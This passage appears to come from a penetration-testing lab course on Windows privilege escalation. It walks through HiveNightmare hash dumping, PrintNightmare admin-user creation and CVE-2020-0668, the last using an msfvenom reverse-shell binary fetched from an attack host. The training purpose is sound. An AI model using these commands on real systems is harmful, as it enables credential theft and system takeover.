<p><code>ALPC Task Scheduler 0-Day</code> - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to <code>.job</code> files located in the <code>C:\Windows\tasks</code> directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN">SchRpcSetSecurity</a> API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available <a href="https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html">here</a>. The Hack The Box box <a href="https://snowscan.io/htb-writeup-hackback/">Hackback</a> can be used to try out this privilege escalation exploit.</p>
<p>Summer of 2021 revealed a treasure trove of new Windows and Active Directory-related remote code execution and local privilege escalation flaws to the delight of penetration testers (and real-world attackers), and I&#39;m sure groans from our hard-working colleagues on the defense side of things.</p>
<p><code>CVE-2021-36934 HiveNightmare, aka SeriousSam</code> is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found <a href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5">here</a> and <a href="https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe">this</a> exploit binary can be used to create copies of the three files to our working directory. This <a href="https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1">script</a> can be used to detect the flaw and also fix the ACL issue. Let&#39;s take a look.</p>
<p><strong>Checking Permissions on the SAM File</strong></p>
<p>We can check for this vulnerability using <code>icacls</code> to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the <code>BUILTIN\Users</code> group.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; icacls c:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>AM

C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>AM BUILTIN<span class="hljs-symbol">\A</span>dministrators:(I)(F)
                               NT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM:(I)(F)
                               BUILTIN<span class="hljs-symbol">\U</span>sers:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
</code></pre>
<p>Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have <code>System Protection</code> enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.</p>
<p><strong>Performing Attack and Parsing Password Hashes</strong></p>
<p>This <a href="https://github.com/GossiTheDog/HiveNightmare">PoC</a> can be used to perform the attack, creating copies of the aforementioned registry hives:</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS C:\Users\htb-student\Desktop&gt; .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

<span class="hljs-keyword">Success: </span>SAM hive from 2021<span class="hljs-string">-08</span><span class="hljs-string">-07</span> written out to current working directory as SAM<span class="hljs-string">-2021</span><span class="hljs-string">-08</span><span class="hljs-string">-07</span>

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY

<span class="hljs-keyword">Success: </span>SECURITY hive from 2021<span class="hljs-string">-08</span><span class="hljs-string">-07</span> written out to current working directory as SECURITY<span class="hljs-string">-2021</span><span class="hljs-string">-08</span><span class="hljs-string">-07</span>

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

<span class="hljs-keyword">Success: </span>SYSTEM hive from 2021<span class="hljs-string">-08</span><span class="hljs-string">-07</span> written out to current working directory as SYSTEM<span class="hljs-string">-2021</span><span class="hljs-string">-08</span><span class="hljs-string">-07</span>


Assuming no errors above, you should be able to find hive dump files in current working directory.
</code></pre>
<p>These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ impacket-secretsdump -sam SAM<span class="hljs-number">-2021</span><span class="hljs-number">-08</span><span class="hljs-number">-07</span> -system SYSTEM<span class="hljs-number">-2021</span><span class="hljs-number">-08</span><span class="hljs-number">-07</span> -security SECURITY<span class="hljs-number">-2021</span><span class="hljs-number">-08</span><span class="hljs-number">-07</span> local

Impacket v0<span class="hljs-number">.10</span><span class="hljs-number">.1</span>.dev1+<span class="hljs-number">20230316.112532</span>.f0ac44bd - Copyright <span class="hljs-number">2022</span> Fortra

[*] Target system <span class="hljs-string">bootKey:</span> <span class="hljs-number">0xebb2121de07ed08fc7dc58aa773b23d6</span>
[*] Dumping local SAM hashes (<span class="hljs-string">uid:</span><span class="hljs-string">rid:</span><span class="hljs-string">lmhash:</span>nthash)
<span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">7796</span><span class="hljs-string">ee39fd3a9c3a1844556115ae1a54:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">c93428723187f868ae2f99d4fa66dceb:</span>::
<span class="hljs-string">mrb3n:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">7796</span><span class="hljs-string">ee39fd3a9c3a1844556115ae1a54:</span>::
htb-<span class="hljs-string">student:</span><span class="hljs-number">1002</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">3</span><span class="hljs-string">c0e5d303ec84884ad5c3b7876a06ea6:</span>::
[*] Dumping cached domain logon information (domain/<span class="hljs-string">username:</span>hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
<span class="hljs-string">dpapi_machinekey:</span><span class="hljs-number">0x3c7b7e66890fb2181a74bb56ab12195f248e9461</span>
<span class="hljs-string">dpapi_userkey:</span><span class="hljs-number">0xc3e6491e75d7cffe8efd40df94d83cba51832a56</span>
[*] NL$KM 
 <span class="hljs-number">0000</span>   <span class="hljs-number">45</span> C5 B2 <span class="hljs-number">32</span> <span class="hljs-number">29</span> <span class="hljs-number">8</span>B <span class="hljs-number">05</span> B8  E7 E7 E0 <span class="hljs-number">4</span>B <span class="hljs-number">2</span>C <span class="hljs-number">14</span> <span class="hljs-number">83</span> <span class="hljs-number">02</span>   E.<span class="hljs-number">.2</span>)......K,...
 <span class="hljs-number">0010</span>   CE <span class="hljs-number">2</span>F E7 D9 B8 E0 F0 F8  <span class="hljs-number">20</span> C8 E4 <span class="hljs-number">70</span> DD D1 <span class="hljs-number">7</span>F <span class="hljs-number">4</span>F   ./...... ..p...O
 <span class="hljs-number">0020</span>   <span class="hljs-number">42</span> <span class="hljs-number">2</span>C E6 <span class="hljs-number">9</span>E AF <span class="hljs-number">57</span> <span class="hljs-number">74</span> <span class="hljs-number">01</span>  <span class="hljs-number">09</span> <span class="hljs-number">88</span> B3 <span class="hljs-number">78</span> <span class="hljs-number">17</span> <span class="hljs-number">3</span>F <span class="hljs-number">88</span> <span class="hljs-number">54</span>   B,...Wt....x.?.T
 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
NL$KM:<span class="hljs-number">45</span>c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
</code></pre>
<p><code>CVE-2021-1675/CVE-2021-34527 PrintNightmare</code> is a flaw in <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22">RpcAddPrinterDriver</a> which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege <code>SeLoadDriverPrivilege</code> the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user&#39;s machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence &quot;nightmare.&quot; Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">patch</a> in July of 2021 along with guidance to check that specific registry settings are either set to <code>0</code> or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. <a href="https://github.com/cube0x0/CVE-2021-1675">This</a> version by <a href="https://twitter.com/cube0x0">@cube0x0</a> can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This <a href="https://github.com/calebstewart/CVE-2021-1675">PowerShell implementation</a> can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.</p>
<p><strong>Checking for Spooler Service</strong></p>
<p>We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a &quot;path does not exist&quot; error.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; ls <span class="hljs-symbol">\\</span>localhost<span class="hljs-symbol">\p</span>ipe<span class="hljs-symbol">\s</span>poolss


    Directory: <span class="hljs-symbol">\\</span>localhost<span class="hljs-symbol">\p</span>ipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
</code></pre>
<p><strong>Adding Local Admin with PrintNightmare PowerShell PoC</strong></p>
<p>First start by <a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">bypassing</a> the execution policy on the target host:</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you <span class="hljs-keyword">from</span> scripts <span class="hljs-literal">that</span> you <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> trust. Changing the execution policy might expose
you <span class="hljs-keyword">to</span> the security risks described <span class="hljs-keyword">in</span> the about_Execution_Policies help topic at
https:<span class="hljs-regexp">/go.microsoft.com/fwlink/</span>?LinkID=<span class="hljs-number">135170.</span> Do you want <span class="hljs-keyword">to</span> change the execution policy?
[Y] Yes  [A] Yes <span class="hljs-keyword">to</span> All  [N] No  [L] No <span class="hljs-keyword">to</span> All  [S] Suspend  [?] Help (<span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-string">"N"</span>): A
</code></pre>
<p>Now we can import the PowerShell script and use it to add a new local admin user.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Import-Module .<span class="hljs-symbol">\C</span>VE-2021-1675.ps1
PS C:<span class="hljs-symbol">\h</span>tb&gt; Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\n</span>ightmare.dll
[+] using pDriverPath = "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\D</span>riverStore<span class="hljs-symbol">\F</span>ileRepository<span class="hljs-symbol">\n</span>tprint.inf_am
d64_ce3301b66255a0fb<span class="hljs-symbol">\A</span>md64<span class="hljs-symbol">\m</span>xdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\n</span>ightmare.dll
</code></pre>
<p><strong>Confirming New Admin User</strong></p>
<p>If all went to plan, we will have a new local admin user under our control. Adding a user is &quot;noisy,&quot; We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">hacker</span>

<span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          <span class="hljs-number">000</span> (System Default)
Account active               Yes
Account expires              Never

Password last set            ?<span class="hljs-number">8</span>/?<span class="hljs-number">9</span>/?<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:<span class="hljs-number">01</span> PM
Password expires             Never
Password changeable          ?<span class="hljs-number">8</span>/?<span class="hljs-number">9</span>/?<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:<span class="hljs-number">01</span> PM
Password required            Yes
<span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes

Workstations allowed         All
Logon script                 
<span class="hljs-keyword">User</span> <span class="hljs-title">profile</span>                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>      *Administrators       
Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *None                 
The command completed successfully.
</code></pre>
<p>This is a small sampling of some of the highest impact vulnerabilities. While it is imperative for us to understand and be able to enumerate and exploit these vulnerabilities, it is also important to be able to detect and leverage lesser-known flaws.</p>
<hr>
<h3 id="enumerating-missing-patches">Enumerating Missing Patches</h3>
<p>The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.</p>
<p><strong>Examining Installed Updates</strong></p>
<p>We can examine the installed updates in several ways. Below are three separate commands we can use.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; systeminfo
PS <span class="hljs-keyword">C</span>:\htb&gt; wmic qfe list brief
PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-Hotfix
</code></pre>
<p><strong>Viewing Installed Updates with WMI</strong></p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wmic qfe list brief

Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
Update                        KB<span class="hljs-number">4601056</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/27/2021</span>                                    
Update                        KB<span class="hljs-number">4513661</span>                                    <span class="hljs-number">1/9/2020</span>                                     
Security Update               KB<span class="hljs-number">4516115</span>                                    <span class="hljs-number">1/9/2020</span>                                     
Update                        KB<span class="hljs-number">4517245</span>                                    <span class="hljs-number">1/9/2020</span>                                     
Security Update               KB<span class="hljs-number">4528759</span>                                    <span class="hljs-number">1/9/2020</span>                                     
Security Update               KB<span class="hljs-number">4535680</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/27/2021</span>                                    
Security Update               KB<span class="hljs-number">4580325</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/27/2021</span>                                    
Security Update               KB<span class="hljs-number">5000908</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/27/2021</span>                                    
Security Update               KB<span class="hljs-number">5000808</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/27/2021</span>
</code></pre>
<p>We can search for each KB (Microsoft Knowledge Base ID number) in the <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808">Microsoft Update Catalog</a> to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for <code>KB5000808</code> shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.</p>
<hr>
<h3 id="cve-2020-0668-example">CVE-2020-0668 Example</h3>
<p>Next, let&#39;s exploit <a href="https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/">Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability</a>, which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a <code>.OLD</code> extension when the service is triggered. This move operation is performed by <code>NT AUTHORITY\SYSTEM</code>, and can be abused to move a file of our choosing with the help of mount points and symbolic links.</p>
<p><strong>Checking Current User Privileges</strong></p>
<p>Let&#39;s verify our current user&#39;s privileges.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
</code></pre>
<p><strong>After Building Solution</strong></p>
<p>We can use <a href="https://github.com/RedCursorSecurityConsulting/CVE-2020-0668">this</a> exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">0668</span><span class="hljs-selector-class">.exe</span>
CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">0668</span><span class="hljs-selector-class">.exe</span><span class="hljs-selector-class">.config</span>
CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">0668</span><span class="hljs-selector-class">.pdb</span>
NtApiDotNet<span class="hljs-selector-class">.dll</span>
NtApiDotNet.xml
</code></pre>
<p>At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren&#39;t able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as <a href="https://github.com/itm4n/UsoDllLoader">UsoDllLoader</a> or <a href="https://github.com/xct/diaghub">DiagHub</a> to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.</p>
<p>We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.</p>
<ul>
<li><code>C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe</code></li>
</ul>
<p><strong>Checking Permissions on Binary</strong></p>
<p><code>icacls</code> confirms that we only have read and execute permissions on this binary based on the line <code>BUILTIN\Users:(I)(RX)</code> in the command output.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; icacls "c:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe"

C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe NT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM:(I)(F)
                                                                          BUILTIN<span class="hljs-symbol">\A</span>dministrators:(I)(F)
                                                                          BUILTIN<span class="hljs-symbol">\U</span>sers:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
</code></pre>
<p><strong>Generating Malicious Binary</strong></p>
<p>Let&#39;s generate a malicious <code>maintenanceservice.exe</code> binary that can be used to obtain a Meterpreter reverse shell connection from our target.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_https LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span> LPORT=<span class="hljs-number">8443</span> -f exe &gt; maintenanceservice.exe

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">645</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
</code></pre>
<p><strong>Hosting the Malicious Binary</strong></p>
<p>We can download it to the target using cURL after starting a Python HTTP server on our attack host like in the <code>User Account Control</code> section previously. We can also use wget from the target.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ $ python3 -m http.server <span class="hljs-number">8080</span>

Serving HTTP on <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">8080</span> (http://<span class="hljs-number">0.0.0.0:8080</span>/) ...
<span class="hljs-number">10.129.43.13</span> - - <span class="hljs-string">[01/Mar/2022 18:17:26]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /maintenanceservice.exe HTTP/1.1"</span> <span class="hljs-number">200</span> -
<span class="hljs-number">10.129.43.13</span> - - <span class="hljs-string">[01/Mar/2022 18:17:45]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /maintenanceservice.exe HTTP/1.1"</span> <span class="hljs-number">200</span> -
</code></pre>
<p><strong>Downloading the Malicious Binary</strong></p>
<p>For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.</p>
<p>We need to do this because running the exploit corrupts the malicious version of <code>maintenanceservice.exe</code> that is moved to (our copy in <code>c:\Users\htb-student\Desktop</code> that we are targeting) <code>c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe</code> which we will need to account for later. If we attempt to utilize the copied version, we will receive a <code>system error 216</code> because the .exe file is no longer a valid binary.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; wget <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe</span>
PS <span class="hljs-string">C:</span>\htb&gt; wget <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe</span>
</code></pre>
<p><strong>Running the Exploit</strong></p>
<p>Next, let&#39;s run the exploit. It accepts two arguments, the source and destination files.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; C:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\C</span>VE-2020-0668<span class="hljs-symbol">\C</span>VE-2020-0668.exe C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\m</span>aintenanceservice.exe "C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe"                                       

[+] Moving C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\m</span>aintenanceservice.exe to C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe

[+] Mounting <span class="hljs-symbol">\R</span>PC Control onto C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\n</span>zrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>racing<span class="hljs-symbol">\R</span>ASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\1</span>79739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
</code></pre>
<p><strong>Checking Permissions of New File</strong></p>
<p>The exploit runs and executing <code>icacls</code> again shows the following entry for our user: <code>WINLPE-WS02\htb-student:(F)</code>. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; icacls 'C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe'

C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe NT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM:(F)
                                                                          BUILTIN<span class="hljs-symbol">\A</span>dministrators:(F)
                                                                          WINLPE-WS02<span class="hljs-symbol">\h</span>tb-student:(F)
</code></pre>
<p><strong>Replacing File with Malicious Binary</strong></p>
<p>We can overwrite the <code>maintenanceservice.exe</code> binary in <code>c:\Program Files (x86)\Mozilla Maintenance Service</code> with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to <code>C:\Users\htb-student\Desktop</code>, <code>maintenanceservice.exe</code> and <code>maintenanceservice2.exe</code>. Let&#39;s move the good copy that was not corrupted by the exploit <code>maintenanceservice2.exe</code> to the Program Files directory, making sure to rename the file properly and remove the <code>2</code> or the service won&#39;t start. The <code>copy</code> command will only work from a cmd.exe window, not a PowerShell console.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; copy /Y C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\m</span>aintenanceservice2.exe "c:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>ozilla Maintenance Service<span class="hljs-symbol">\m</span>aintenanceservice.exe"

        1 file(s) copied.
</code></pre>
<p><strong>Metasploit Resource Script</strong></p>
<p>Next, save the below commands to a <a href="https://docs.rapid7.com/metasploit/resource-scripts/">Resource Script</a> file named <code>handler.rc</code>.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>
<span class="hljs-keyword">set</span> PAYLOAD windows/x64/meterpreter/reverse_https
<span class="hljs-keyword">set</span> LHOST &lt;our_ip&gt;
<span class="hljs-keyword">set</span> LPORT <span class="hljs-number">8443</span>
exploit
</code></pre>
<p><strong>Launching Metasploit with Resource Script</strong></p>
<p>Launch Metasploit using the Resource Script file to preload our settings.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo msfconsole -r handler.rc 


         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       <span class="hljs-string">'   dB'</span>                     BBP
    dB<span class="hljs-string">'dB'</span>dB<span class="hljs-string">' dBBP     dBP     dBP BB
   dB'</span>dB<span class="hljs-string">'dB'</span> dBP      dBP     dBP  BB
  dB<span class="hljs-string">'dB'</span>dB<span class="hljs-string">' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB'</span> dBP    dB<span class="hljs-string">'.BP
                             |       dBP    dBBBB'</span> dBP    dB<span class="hljs-string">'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'</span>.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  <span class="hljs-keyword">To</span> boldly <span class="hljs-keyword">go</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">no</span>
